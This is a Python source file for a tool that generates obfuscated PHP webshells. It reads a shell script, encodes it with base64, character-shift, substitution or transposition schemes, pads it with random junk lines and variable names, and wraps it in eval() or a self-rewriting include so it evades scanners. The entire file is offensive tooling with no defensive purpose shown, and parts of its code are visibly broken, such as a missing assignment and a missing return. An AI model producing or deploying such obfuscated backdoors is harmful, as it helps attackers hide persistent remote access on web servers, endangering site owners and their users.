#! /usr/bin/python

from shell import Shell  
from util import Encoders, Junk, PhpParser 


class Php(Shell): 
	
	php_reserved = [ 
		'$GLOBALS', '$_SERVER', '$_REQUEST', '$_POST', '$_GET', 
		'$_FILES', '$_ENV', '$_COOKIE', '$_SESSION', 
		'$argc', '$argv', '$this->' 
	] 
	
	def __init__(self, path = None):
		Shell.__init__(self, 'php')
		self.shell_path = self.Path.php if path is None else path
		self.shell_text = self.Read(self.shell_path)
	
	def Encode(self, encoding): 
		if encoding == 'b64' : return self.Base64()
		if encoding == 'ord' : return self.OrdPlus()
		if encoding == 'rnd' : return self.Random()
		if encoding == 'rot' : return self.RotPlus()
	
	def Create(self, payload, add_junk = False): 
		shell = self.Execution(payload) 
		if add_junk : 
			shell = ''.join( 
				line + ' \n' + Junk().Php([ '$' + self.makeVars() for _ in range(4) ])[self.rndInt(1, 5)] + '\n' 
				for line in shell.split(' \n')
			)
		shell = '<?php \n' + shell +  '?>' 
		return shell
	
	def Base64(self): 
		shell_encoded = Encoders(PhpParser(self.shell_text).StripTags()).Base64()
		junk = self.makeJunk(shell_encoded + 'base64_decode', self.an_chars) 
		vals = self.makeVals(shell_encoded, junk)
		self.vars += [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + vals[i] + '" ; \n' for i in range(len(vals)) ])
		payload += self.vars[1] + ' = str_replace( "' + junk + '", "", ' + self.vars[0] + ' ); \n' 
		payload += self.vars[2] + ' = str_replace( "' + junk + '", "", ' + junk.join([ c for c in '"base64_decode"' ]) + ' ); \n' 
		payload += self.vars[3] + ' = ' + self.vars[2] + '( ' + self.vars[1] + ' ); \n' 
		return payload
	
	def OrdPlus(self): 
		shell_encoded, ord_plus, chr_join = Encoders(PhpParser(self.shell_text).StripTags()).OrdPlus()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(3) ]
		
		payload = self.vars[2] + ' = ""; \n'
		payload += self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + vals[i] + '"; \n' for i in range(len(vals))]) 
		payload += 'foreach(explode("' + chr_join + '", ' + self.vars[0] + ') as ' + self.vars[1] + ') ' 
		payload +=  self.vars[2] + ' .= chr(' + self.vars[1] + ' - ' + str(ord_plus) + '); \n' 
		return payload
	
	def Random(self): 
		clean_str = lambda s : s.encode('unicode-escape').replace('"', '\\"').replace("$", "\\$")
		shell_encoded, cs1, cs2 = Encoders(PhpParser(self.shell_text).StripTags()).Random()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[3] + ' = ""; \n' 
		payload += self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + clean_str(vals[i]) + '"; \n' for i in range(len(vals)) ]) 
		payload += self.vars[1] + ' = "' + clean_str(cs1) + '"; \n' 
		payload += self.vars[2] + ' = "' + clean_str(cs2) + '"; \n' 
		payload += 'foreach(str_split(' + self.vars[0] + ') as $c) { ' 
		payload += self.vars[3] + ' .= (strpos(' + self.vars[2] + ', $c) === false) ? $c : ' 
		payload += self.vars[1] + '[strpos(' + self.vars[2] + ', $c)]; } \n' 
		return payload
	
	def RotPlus(self): 
		clean_str = lambda s : s.encode('unicode-escape').replace('"', '\\"').replace("$", "\\$")
		shell_encoded, rows = Encoders(PhpParser(self.shell_text).StripTags()).Rot90()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[1] + ' = ' + str(rows) + '; \n' 
		payload += self.vars[2] + ' = array(); \n' 
		payload += self.vars[0] + ' = "" ; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + clean_str(vals[i]) + '"; \n' for i in range(len(vals)) ]) 
		payload += 'for($i = 0; $i < ' + self.vars[1] + '; $i++) ' + self.vars[2] + '[] = ""; \n' 
		payload += 'for($i = 0; $i < (strlen(' + self.vars[0] + ') / ' + self.vars[1] + '); $i++) '  
		payload += '{ for($r = 0; $r < ' + self.vars[1] + '; $r++) ' 
		payload +=  self.vars[2] + '[$r] .= ' + self.vars[0] + '[$r + $i * ' + self.vars[1] + ']; } \n' 
		payload += self.vars[3] + ' = trim(implode("", ' + self.vars[2] + ')); \n' 
		return payload
	
	def Execution(self, code, method = 'eval'): 
		if method == 'eval' : return code + 'eval( ' + self.vars[-1] + ' ); \n' 
		self.vars += [ '$' + self.makeVars() for _ in range(2) ]
		payload = self.vars[-2] + ' = __file__; \n' 
		payload += self.vars[-1] + 'file_get_contents(' + self.vars[-2] + '); \n' 
		payload += code 
		payload += 'file_put_contents(' + self.vars[-2] + ', "<?php \n" . ' + code + ' . "?>"); \n' 
		payload += 'include( ' + self.vars[-2] + ' ) \n;' 
		payload += 'file_put_contents(' + self.vars[-2] + ', ' + self.vars[-1] + '); \n' 


